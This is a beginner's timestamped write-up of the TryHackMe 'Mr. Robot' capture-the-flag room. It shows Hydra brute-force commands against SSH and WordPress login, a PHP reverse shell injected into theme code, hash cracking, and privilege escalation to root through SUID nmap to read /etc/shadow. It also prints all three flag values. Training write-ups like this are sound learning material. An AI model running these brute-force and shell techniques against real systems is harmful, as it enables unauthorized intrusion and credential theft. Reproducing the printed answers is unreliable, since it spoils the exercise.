# Mr. Robot CTF — TryHackMe



## Engagement Notes

### `[05/20/26 18:53]` — Start

THM-Mr_Robot_CTF

The directions say

> "Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?"

It looks like there are 3 keys to find. Let's see what we find.

---

### `[05/20/26 18:59]`

nmap shows that 80 and 443 are open. I'll check to see if anything loads on the IP in a browser.

---

### `[05/20/26 19:02]`

typing to IP into the browser heads to an interactive page that starts with

```
02:00 - !- friend_ [friend_@208.185.115.6] has joined #fsociety.
02:00 <mr. robot> Hello friend. If you've come, you've come for a reason. You may not be able to explain it yet, but there's a part of you that's exhausted with this world... a world that decides where you work, who you see, and how you empty and fill your depressing bank account. Even the Internet connection you're using to read this is costing you, slowly chipping away at your existence. There are things you want to say. Soon will give you a voice. Today your education begins.
Commands:
prepare fsociety inform question wakeup join
root@fsociety:~#
```

---

### `[05/20/26 19:04]`

Not sure if it's useful at all, but there was a screen that showed user as root.

Noteable right away is the user friend_ and the IP 208.185.115.6

---

### `[05/20/26 19:15]` — Directory & File Brute-Force

```
gobuster dir -u http://10.144.143.55 -w /usr/share/wordlists/dirb/small.txt
```

```
/0                    (Status: 301) [Size: 0] [--> http://10.144.143.55/0/]
/admin                (Status: 301) [Size: 235] [--> http://10.144.143.55/admin/]
/blog                 (Status: 301) [Size: 234] [--> http://10.144.143.55/blog/]
/css                  (Status: 301) [Size: 233] [--> http://10.144.143.55/css/]
/images               (Status: 301) [Size: 236] [--> http://10.144.143.55/images/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 232] [--> http://10.144.143.55/js/]
/login                (Status: 302) [Size: 0] [--> http://10.144.143.55/wp-login.php]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rss                  (Status: 301) [Size: 0] [--> http://10.144.143.55/feed/]
/sitemap              (Status: 200) [Size: 0]
/xmlrpc               (Status: 405) [Size: 42]
```

---

### `[05/20/26 19:20]`

While enumerating a directory, I found the link http://10.144.143.55/wp-content/themes/twentyfifteen/js/html5.js

There's a hidden element in there, that might be interesting.

---

### `[05/20/26 19:22]`

http://10.144.143.55/wp-login.php

Also could be interesting

---

### `[05/20/26 19:25]`

http://10.144.143.55/xmlrpc

"XML-RPC server accepts POST requests only."

---

### `[05/20/26 19:26]`

http://10.144.143.55/phpmyadmin

"For security reasons, this URL is only accessible using localhost (127.0.0.1) as the hostname."

Perhaps there is a key here after accessing the box?

---

### `[05/20/26 19:34]`

I don't seem to be getting anywhere with the directories, I'll try a brute force on SSH with Hydra.

```
hydra -l friend_ -P /usr/share/wordlists/rockyou.txt ssh://10.144.143.55
```

---

### `[05/20/26 19:43]`

I attempted a SQL injection on the /wp-login page wtih no success

---

### `[05/20/26 19:43]`

I changed the Hydra to username root

---

### `[05/20/26 19:46]` — Inspector

Not much, see other notes..

---

### `[05/20/26 19:51]` — Robots.txt & Sitemap Review

/robots.txt

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

---

### `[05/20/26 19:53]` — 🔑 Key 1 Found

On the directory /robots.txt I found

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

I thought I searched this earlier, but I guess I didnt. I then tried

/key-1-of-3.txt and found the key

```
073403c8a58a1f80d943455fb30724b9
```

---

### `[05/20/26 19:56]`

I'm hoping that the fsociety.dic is helpful in some way.

Taking a look, it is not. Perhaps an injection in the search box?

---

### `[05/20/26 20:06]`

Turns out THE REASON YOU COPY AND PASTE IS mispellings. This will ruin a day

I was banging my head against the wall because I wasnt getting anywhere with /fsociety.dic.

/fsocity.dic is where it's at. There's a download here.

---

### `[05/20/26 20:10]`

Ok, so fsocity.dic has 858,160 words. Clearly I'm supposed to cull this down with something. I'll try to grep "key" and see what happens

---

### `[05/20/26 20:19]`

I'm trying to do this through a THM Kali machine and it is ungodly slow. I'm going to have to come back to this on my own Kali box tomorrow.

---

## Day 2 — `05/21/26`

> **New IP:** `10.146.190.32`

---

### `[05/21/26 10:27]`

AND I'M BACK

On my own Kali box, so I should be able to work faster on this.

---

### `[05/21/26 10:30]`

Searching the fsocity.doc, I'm not finding much when searching for key. I'm actually finding a lot, but nothing useful in terms of key2

---

### `[05/21/26 10:30]`

Perhaps I can use this as a wordlist to bruteforce the login at /wp-login.php

---

### `[05/21/26 10:40]`

To do this bruteforce, I'll intercept a login wiht Burp, send to Intruder.
Then setup a clusterbomb attack on the username and password using the wordlist. It's a bid list, this might take a while.

---

### `[05/21/26 10:45]`

I quickly changed to a Pitchfork attack. I need a cheat sheet for when to use what attack :)

---

### `[05/21/26 10:48]`

Elliot:Elliot stands out pretty quickly with a different length response.

The combo returns an error when logging in. Perhaps I'll quicken this up by replacing the username to Elliot so Burp can work through the wordlist quicker.

---

### `[05/21/26 10:50]`

Ok, changed the intruder to a sniper attack. Hope this finds something

---

### `[05/21/26 10:51]`

Now that I think about it, I could probably speed this up by removing anything shorter than 3-4 characters for the wordlist.

---

### `[05/21/26 10:55]`

did this with

```
grep -E '^.{5,}$' robot.txt > shrtbot.txt
```

---

### `[05/21/26 10:57]`

It's still quite long. perhaps I'll start with cutting 7 or less characters.

---

### `[05/21/26 11:05]`

Another thought, perhaps the password IS the key. What happens if I cut the list to 32 characters?

---

### `[05/21/26 11:07]`

```
grep -E '^.{32,}$' robot.txt > 32bot.txt
```

That narrows it down to 1,426. Much better, I'll try that

---

### `[05/21/26 11:13]`

I'm still seeing nothing. I feel like I must be overthinking this give that it's supposed to be an EASY room that takes 30 minutes. HA, sure thing buddy..

---

### `[05/21/26 11:31]`

I attempted to go back to hydra with the command

```
hydra -L robot.txt -p password 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"
```

Is seems that all these users can login with the password...password

That seems....not right..

---

### `[05/21/26 11:34]`

wait, now I see waht I did wrong. I changed the F= to "invalid username. THEN it returned

```
Elliot:password
```

I think this confirms that Elliot is the correct name

---

### `[05/21/26 11:37]`

Attempting the creds Elliot:password returns the following

```
ERROR: The password you entered for the username elliot is incorrect. Lost your password?
```

---

### `[05/21/26 11:44]`

So that confirms that elliot is a valid username. I'll alter the search to hunt for a valid password.

```
hydra -l elliot -P robot.txt 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=username elliot is incorrect"
```

This was SO MUCH FASTER than using the Sniper attack in Burp. I have a list of potentially valid creds. Let's see what works

```
[80][http-post-form] host: 10.146.190.32   login: elliot   password: wikia
[80][http-post-form] host: 10.146.190.32   login: elliot   password: true
[80][http-post-form] host: 10.146.190.32   login: elliot   password: false
[80][http-post-form] host: 10.146.190.32   login: elliot   password: the
[80][http-post-form] host: 10.146.190.32   login: elliot   password: from
[80][http-post-form] host: 10.146.190.32   login: elliot   password: now
[80][http-post-form] host: 10.146.190.32   login: elliot   password: Wikia
[80][http-post-form] host: 10.146.190.32   login: elliot   password: window
[80][http-post-form] host: 10.146.190.32   login: elliot   password: extensions
[80][http-post-form] host: 10.146.190.32   login: elliot   password: scss
[80][http-post-form] host: 10.146.190.32   login: elliot   password: Elliot
[80][http-post-form] host: 10.146.190.32   login: elliot   password: styles
[80][http-post-form] host: 10.146.190.32   login: elliot   password: http
[80][http-post-form] host: 10.146.190.32   login: elliot   password: Robot
[80][http-post-form] host: 10.146.190.32   login: elliot   password: var
[80][http-post-form] host: 10.146.190.32   login: elliot   password: page
1 of 1 target successfully completed, 16 valid passwords found
```

---

### `[05/21/26 11:48]`

This doesn't seem right either. None of these work. Again, I thin I have my error message wrong.

```
hydra -l elliot -P robot.txt 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"
```

This seems to be taking more time. I can only assume it's not finding false positives.

---

### `[05/21/26 11:54]`

Maybe I need to run this against the rockyou.txt wordlist...

---

### `[05/21/26 11:56]`

```
hydra -l elliot -P /usr/share/wordlists/rockyou.txt 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=ERROR"
```

---

### `[05/21/26 11:57]`

I also attempted

```
hydra -l elliot -P /usr/share/wordlists/rockyou.txt 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username elliot is incorrect."
```

with no success

---

### `[05/21/26 12:01]`

Rockyou.txt is not turning up anything. Trying yet another...

```
hydra -l Elliot -P robot.txt 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered for the username"
```

---

### `[05/21/26 12:22]`

Alright, what the hell... based on the note that this room should take 30 minutes, I would assume I should get a response back fairly quick. I've given many searches 5+ minutes with no results. I guess I'll let hydra run and go get lunch. Maybe something will come back. If not.. I think I'm at a dead end. I'll be honest, I looked up a walkthrough and confirmed that I was on the right track. I'm just not getting results. I was able to get a fairly quick response with the username, but not with the password. I'm not really sure how to move forward if the hydra search can't find anything.

---

### `[05/21/26 12:46]`

Ok, 30 minutes into a hydra search on the original wordlist is getting me nowhere. I've shortened the list to 385,352 lines by using

```
awk 'length($0) <= 8' robot.txt | grep -E '^.{5,}$' > small.txt
```

---

### `[05/21/26 12:59]`

I'm literally getting nowhere. I'm going back to do do another directory search to see if I missed something.

```
gobuster dir -u http://10.146.190.32 -w /usr/share/wordlists/dirb/big.txt
```

---

### `[05/21/26 13:05]`

Well then..

The big.txt list is turning back a few more results

```
.htaccess            (Status: 403) [Size: 218]
.htpasswd            (Status: 403) [Size: 218]
0                    (Status: 301) [Size: 0] [--> http://10.146.190.32/0/]
0000                 (Status: 301) [Size: 0] [--> http://10.146.190.32/0000/]
Image                (Status: 301) [Size: 0] [--> http://10.146.190.32/Image/]
admin                (Status: 301) [Size: 235] [--> http://10.146.190.32/admin/]
atom                 (Status: 301) [Size: 0] [--> http://10.146.190.32/feed/atom/]
audio                (Status: 301) [Size: 235] [--> http://10.146.190.32/audio/]
blog                 (Status: 301) [Size: 234] [--> http://10.146.190.32/blog/]
css                  (Status: 301) [Size: 233] [--> http://10.146.190.32/css/]
dashboard            (Status: 302) [Size: 0] [--> http://10.146.190.32/wp-admin/]
favicon.ico          (Status: 200) [Size: 0]
feed                 (Status: 301) [Size: 0] [--> http://10.146.190.32/feed/]
image                (Status: 301) [Size: 0] [--> http://10.146.190.32/image/]
images               (Status: 301) [Size: 236] [--> http://10.146.190.32/images/]
intro                (Status: 200) [Size: 516314]
js                   (Status: 301) [Size: 232] [--> http://10.146.190.32/js/]
license              (Status: 200) [Size: 309]
login                (Status: 302) [Size: 0] [--> http://10.146.190.32/wp-login.php]
page1                (Status: 301) [Size: 0] [--> http://10.146.190.32/]
phpmyadmin           (Status: 403) [Size: 94]
rdf                  (Status: 301) [Size: 0] [--> http://10.146.190.32/feed/rdf/]
readme               (Status: 200) [Size: 64]
robots               (Status: 200) [Size: 41]
robots.txt           (Status: 200) [Size: 41]
rss                  (Status: 301) [Size: 0] [--> http://10.146.190.32/feed/]
rss2                 (Status: 301) [Size: 0] [--> http://10.146.190.32/feed/]
sitemap              (Status: 200) [Size: 0]
sitemap.xml          (Status: 200) [Size: 0]
video                (Status: 301) [Size: 235] [--> http://10.146.190.32/video/]
wp-admin             (Status: 301) [Size: 238] [--> http://10.146.190.32/wp-admin/]
wp-content           (Status: 301) [Size: 240] [--> http://10.146.190.32/wp-content/]
wp-config            (Status: 200) [Size: 0]
wp-includes          (Status: 301) [Size: 241] [--> http://10.146.190.32/wp-includes/]
wp-login             (Status: 200) [Size: 2671]
xmlrpc               (Status: 405) [Size: 42]
```

---

### `[05/21/26 13:06]`

On the /license I found the base64 code

```
ZWxsaW90OkVSMjgtMDY1Mgo=
```

that decodes to

```
Elliot:ER28-0652
```

I'll try that on the /wp-login.php

---

### `[05/21/26 13:07]`

and those creds work!

---

### `[05/21/26 13:18]`

Poking around the site after logging in, I found another user named Krista with a clue, "another key" in the bio.
Viewing the page source, I see a password that might be the next key.

```
x@5%Nxes(HJrwz0nJRPAzWzQ
```

---

### `[05/21/26 13:18]`

UGH... It is not the second key...

---

### `[05/21/26 13:20]`

So what if I sign in with the creds

```
mich05654:x@5%Nxes(HJrwz0nJRPAzWzQ
```

nothing

---

### `[05/21/26 13:23]`

Looking at Elliots page, I find the password is dBLtHLpc5A6MW7TXh!%#Eo!4

Perpaps it's a hash...because IT IS NOT THE SECOND KEY!!!!

---

### `[05/21/26 13:26]`

I intentionally put in the correct password for Elliot on a wordlist. after another 30 minutes with hydra, it still hasn't found the password. I don't know what I'm doing wrong there.

```
hydra -l Elliot -P smaller.txt 10.146.190.32 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username"
```

---

### `[05/21/26 13:28]`

Looking at the images, there's a path to the image listed

```
http://10.146.190.32/wp-content/uploads/2015/11/maxresdefault.jpg
```

Perhaps there's a path traversal here?

---

### `[05/21/26 13:30]`

there's also an upload, maybe upload a PHP rev shell?

---

### `[05/21/26 13:33]`

Upload is sanatized. downloadable font: rejected by sanitizer trying different extensions

---

### `[05/21/26 13:34]`

shell.php.jpg uploaded. trying to activate it by going to

```
http://10.146.190.32/wp-content/uploads/2026/05/shell.php_.jpg
```

---

### `[05/21/26 13:36]`

eesh.... no luck getting a rev shell there...

---

### `[05/21/26 13:37]`

OK, back to a walkthrough. I'm seeing that I can edit the code for the site. This is something I've not come across before. Going to copy and paste the PHP rev shell there, load the main page and see if that works.

---

### `[05/21/26 13:40]`

OK, looks like it accepted my code. lets see if I can load the main page and pop a shell..

---

### `[05/21/26 13:44]`

that's not working. what if I change one of the other pages. maybe page.php?

---

### `[05/21/26 13:53]`

wow, I was struggling so hard with this, all because I missed the <?php at the beginning of the script

---

### `[05/21/26 13:54]`

I have a shell!

---

### `[05/21/26 13:57]`

some quick enumeration finds the following

```
$ whoami
daemon
$ hostname
ip-10-146-190-32
$ ls /home
robot
ubuntu
$ cd /home/robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cd password.raw-md5
/bin/sh: 14: cd: can't cd to password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

---

### `[05/21/26 13:58]`

I'll take c3fcd3d76192e4007dfb496cca67e13b over to crackstation to see what I get.

that turns into abcdefghijklmnopqrstuvwxyz

So the robot creds are

```
robot:abcdefghijklmnopqrstuvwxyz
```

---

### `[05/21/26 14:00]`

It looks like nothing happened, but a quick ls tells me I'm in

---

### `[05/21/26 14:00]` — 🔑 Key 2 Found

```
ls
key-2-of-3.txt
password.raw-md5
cat key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

---

### `[05/21/26 14:15]`

ok, gaining access to robot. I searched for an SUID to exploit. This seems to come up a lot so I've been starting here. I found I can exploit nmap to read /etc/shadow.
I then unshadowed shadow and passwd and sent that file through John with the fsocity.dic list

---

### `[05/21/26 14:21]`

I didn't find much with the password cracking. Just for S&G, I tried whoami in the nmap shell
And I'm root. Ok. thats good.

---

### `[05/21/26 14:22]` — 🔑 Key 3 Found

```
nmap> whoami
whoami
root
nmap> find / -name key-3*
find / -name key-3*
/root/key-3-of-3.txt
nmap> cat /root/key-3-of-3.txt
cat /root/key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
```

---

### `[05/21/26 14:24]`

Damn, that took me 5.5 hours (and a bit of help) for a room that is rated at 30 minutes. Ouch...

---

### `[05/21/26 14:24]`

DONE!!!!

---

## Keys Summary

| Key | Value |
|-----|-------|
| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
| Key 2 | `822c73956184f694993bede3eb39f959` |
| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |
